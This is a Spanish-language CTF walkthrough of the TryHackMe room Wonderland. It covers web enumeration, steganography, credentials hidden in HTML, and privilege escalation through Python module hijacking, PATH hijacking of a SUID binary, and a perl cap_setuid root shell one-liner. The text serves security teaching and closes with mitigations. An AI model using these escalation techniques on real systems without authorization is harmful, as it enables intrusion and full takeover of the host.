# TryHackMe – Wonderland (Writeup)

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)

Writeup personal de la máquina **Wonderland** de TryHackMe, una sala de dificultad media ambientada en *Alicia en el País de las Maravillas*. Cubre enumeración web, esteganografía, *Python library hijacking*, *PATH hijacking* sobre un binario SUID y abuso de *Linux capabilities* para escalar a root.

> ℹ️ Las flags se muestran censuradas en este repo. Despliega la máquina en TryHackMe y síguela paso a paso para obtenerlas tú mismo.

---

## Tabla de contenidos

- [Resumen de la cadena de ataque](#resumen-de-la-cadena-de-ataque)
- [1. Reconocimiento](#1-reconocimiento)
- [2. Enumeración web](#2-enumeración-web)
- [3. Esteganografía](#3-esteganografía)
- [4. Siguiendo al conejo](#4-siguiendo-al-conejo)
- [5. Acceso inicial por SSH (alice)](#5-acceso-inicial-por-ssh-alice)
- [6. Escalada: alice → rabbit (Python library hijacking)](#6-escalada-alice--rabbit-python-library-hijacking)
- [7. Escalada: rabbit → hatter (PATH hijacking en binario SUID)](#7-escalada-rabbit--hatter-path-hijacking-en-binario-suid)
- [8. Escalada: hatter → root (Linux capabilities)](#8-escalada-hatter--root-linux-capabilities)
- [Lecciones aprendidas](#lecciones-aprendidas)
- [Herramientas utilizadas](#herramientas-utilizadas)

---

## Resumen de la cadena de ataque

```
Reconocimiento → Enumeración web → Esteganografía → Directory traversal
  → Acceso SSH como alice
    → Python library hijacking          (alice → rabbit)
      → PATH hijacking en binario SUID  (rabbit → hatter)
        → Linux capabilities (cap_setuid en perl) (hatter → root)
```

| Etapa | Usuario obtenido | Técnica |
|---|---|---|
| Acceso inicial | alice | Esteganografía + credenciales ocultas en el HTML |
| Privesc #1 | rabbit | Python library/module hijacking (`random.py`) |
| Privesc #2 | hatter | PATH hijacking sobre binario SUID |
| Privesc #3 | root | Linux capabilities (`cap_setuid` en `perl`) |

---

## 1. Reconocimiento

Escaneo de puertos sobre el objetivo:

```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```

**Resultado:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
80/tcp open  http    HTTP server
```

Solo dos puertos abiertos: SSH (sin credenciales todavía) y un servidor web. El punto de entrada lógico es el puerto 80.

---

## 2. Enumeración web

Al visitar `http://<TARGET_IP>/` aparece una página temática de *Alicia en el País de las Maravillas*, con una imagen de un conejo blanco y el texto "Follow the White Rabbit". No hay formularios ni enlaces visibles, así que toca enumerar directorios:

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -t 50
```

**Resultado relevante:**

```
/img       (Status: 301)
/r         (Status: 301)
/index.html (Status: 301)
```

El directorio `/r` llama la atención: sugiere que hay que "seguir" algo letra por letra (spoiler: la pista de esteganografía lo confirma más abajo).

---

## 3. Esteganografía

La imagen de la página principal (`white_rabbit_1.jpg`) es sospechosa en un CTF. Se descarga y se analiza con `steghide`:

```bash
wget http://<TARGET_IP>/img/white_rabbit_1.jpg
steghide extract -sf white_rabbit_1.jpg
# Passphrase: (vacía, solo pulsar Enter)
```

**Resultado:**

```
wrote extracted data to "hint.txt"
$ cat hint.txt
follow the r a b b i t
```

Los espacios entre letras no son casualidad: son un **path**, `/r/a/b/b/i/t`.

> Las otras imágenes del directorio `/img` (`alice_door.jpg`, `alice_door.png`) no contienen datos extraíbles con esta técnica.

---

## 4. Siguiendo al conejo

Navegando manualmente la ruta deletreada por la pista:

```
/r/a/b/b/i/t
```

Cada subdirectorio intermedio muestra un mensaje tipo "sigue caminando" hasta llegar al final, donde aparece: *"Open the door and enter wonderland"*.

Revisando el código fuente de esa página final se encuentra un `<p>` oculto con `display: none`, invisible en el navegador pero presente en el HTML:

```html
<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
```

**Credenciales obtenidas:**

- Usuario: `alice`
- Contraseña: `HowDothTheLittleCrocodileImproveHisShiningTail`

> 📌 `display: none` solo oculta el elemento visualmente; el contenido sigue estando en el HTML servido. Revisar siempre el código fuente.

---

## 5. Acceso inicial por SSH (alice)

```bash
ssh alice@<TARGET_IP>
# Password: HowDothTheLittleCrocodileImproveHisShiningTail
```

Dentro del home de `alice` aparece `root.txt`, pero pertenece a `root` y no es legible — la sala juega con la idea de que "todo está del revés". La flag de usuario (`user.txt`) se encuentra en realidad en `/root`:

```bash
cat /root/user.txt
thm{FLAG_CENSURADA}
```

---

## 6. Escalada: alice → rabbit (Python library hijacking)

Comprobando permisos sudo:

```bash
sudo -l
```

```
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

El script importa el módulo `random`:

```python
import random
...
```

Python busca los módulos primero en el directorio actual antes que en las rutas del sistema (`sys.path` empieza con `''`). Esto permite colocar un `random.py` propio en el mismo directorio del script para que sea importado en su lugar:

```bash
nano /home/alice/random.py
```

```python
import os
os.system("/bin/bash")
```

Ejecutando el script como `rabbit`:

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Se obtiene una shell como **rabbit**.

---

## 7. Escalada: rabbit → hatter (PATH hijacking en binario SUID)

En el home de `rabbit` hay un binario con el bit SUID activo:

```bash
ls -la /home/rabbit
-rwsr-sr-x 1 root root 8432 ... teaParty
```

Al ejecutarlo:

```
$ ./teaParty
Welcome to the tea party!
Probably by <fecha>
Segmentation fault (core dumped)
```

Analizando las cadenas del binario:

```bash
strings teaParty
```

Entre los resultados aparece una llamada relevante:

```
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```

El binario invoca `date` **sin ruta absoluta**, lo que lo hace vulnerable a *PATH hijacking*: si se antepone un directorio propio al `$PATH` con un ejecutable llamado `date`, el sistema ejecutará ese en lugar del real.

```bash
echo "/bin/bash" > /home/rabbit/date
chmod +x /home/rabbit/date
export PATH=/home/rabbit:$PATH
./teaParty
```

```
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$
```

Se obtiene una shell como **hatter**. Dentro de su home hay una contraseña:

```bash
cat /home/hatter/password.txt
WhyIsARavenLikeAWritingDesk?
```

(Recomendable reconectar por SSH con `hatter` para tener un entorno limpio antes del siguiente paso.)

---

## 8. Escalada: hatter → root (Linux capabilities)

Las *Linux capabilities* dividen los privilegios de root en permisos granulares que pueden asignarse a binarios concretos. Buscamos binarios con capacidades especiales:

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/perl = cap_setuid+ep
```

`perl` tiene `cap_setuid` con flags *effective+permitted*: puede cambiar su UID a 0 sin ser root. El payload (ver [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#capabilities)):

```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

```
# whoami
root
```

Flag final (recordando que está "del revés", en el home de alice):

```bash
cat /home/alice/root.txt
thm{FLAG_CENSURADA}
```

**Root obtenido. ✅**

---

## Lecciones aprendidas

1. **El código fuente HTML siempre es accesible**, aunque el CSS oculte visualmente un elemento (`display: none`).
2. **Esteganografía** es una técnica habitual en CTFs; `steghide` y `binwalk` deben ser parte rutinaria del análisis de imágenes.
3. **El orden de búsqueda de módulos en Python es peligroso**: si un script privilegiado importa módulos sin ruta absoluta, se puede secuestrar el import colocando un archivo con el mismo nombre en el mismo directorio.
4. **Binarios SUID que invocan comandos sin ruta absoluta** son vulnerables a *PATH hijacking*. Mitigación: usar siempre rutas absolutas (`/bin/date`, no `date`).
5. **Las Linux capabilities se pasan por alto a menudo**: `cap_setuid` en un intérprete como `perl` o `python` equivale, en la práctica, a darle privilegios de root. Ejecutar `getcap -r / 2>/dev/null` en toda enumeración Linux.

---

## Herramientas utilizadas

| Herramienta | Uso |
|---|---|
| `nmap` / `rustscan` | Descubrimiento de puertos y servicios |
| `gobuster` | Fuerza bruta de directorios web |
| `steghide` | Extracción de datos ocultos en imágenes |
| `strings` | Análisis estático de binarios |
| `sudo -l` | Enumeración de privilegios sudo |
| `getcap` | Detección de Linux capabilities |

---

## Referencias

- [TryHackMe – Wonderland](https://tryhackme.com/room/wonderland)
- [GTFOBins – Perl](https://gtfobins.github.io/gtfobins/perl/)
- [HackTricks – Linux Capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)

---

*Writeup realizado con fines educativos tras completar la sala en mi propia instancia de TryHackMe.*
